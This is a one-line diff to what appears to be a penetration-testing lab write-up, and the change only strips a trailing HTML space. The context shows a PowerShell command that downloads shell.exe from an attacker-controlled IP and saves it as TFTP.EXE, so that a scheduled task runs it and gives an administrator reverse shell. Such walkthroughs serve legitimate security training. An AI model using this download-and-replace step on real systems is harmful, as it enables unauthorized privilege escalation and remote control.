@@ -147,7 +147,7 @@ C:\Backup>powershell -c wget 192.168.45.161/shell.exe -Outfile TFTP.EXE
 powershell -c wget 192.168.45.161/shell.exe -Outfile TFTP.EXE
 ```
 
-After a few minutes, the task would execute and give us a administrator reverse shell.&#x20;
+After a few minutes, the task would execute and give us a administrator reverse shell.
 
 <figure><img src="../../../.gitbook/assets/image (2503).png" alt=""><figcaption></figcaption></figure>
 
